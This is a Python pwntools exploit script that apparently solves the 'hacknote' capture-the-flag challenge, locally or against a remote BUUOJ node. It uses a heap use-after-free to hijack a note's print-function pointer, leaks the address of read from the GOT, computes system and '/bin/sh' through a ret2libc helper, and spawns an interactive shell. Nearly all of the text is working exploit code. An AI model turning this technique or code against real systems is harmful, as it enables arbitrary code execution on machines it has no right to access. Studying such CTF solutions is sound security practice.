from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './hacknote'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',28542) if argv[1]=='r' else process(binary)

# start
def add(size,name='a'):
	sla('choice :','1')
	sla('size :',str(size))
	sa('Content :',name)

def delete(index):
	sla('choice :','2')
	sla('Index :',str(index))

def show(index):
	sla('choice :','3')
	sla('Index :',str(index))

add(0x10) # 0
add(0x10) # 1
delete(0)
delete(1)
print_content = 0x804862b
add(0x8,flat(print_content,elf.got['read']))
# step1: malloc(0x10) from 1's print func
# step2: malloc(0x10) from 0's print func
show(0)
read = uu32(r(4))
leak('read',read)
system,binsh = ret2libc(read,'read')
delete(2)
add(0x8,flat(system,'||sh'))
show(0)
# end

itr()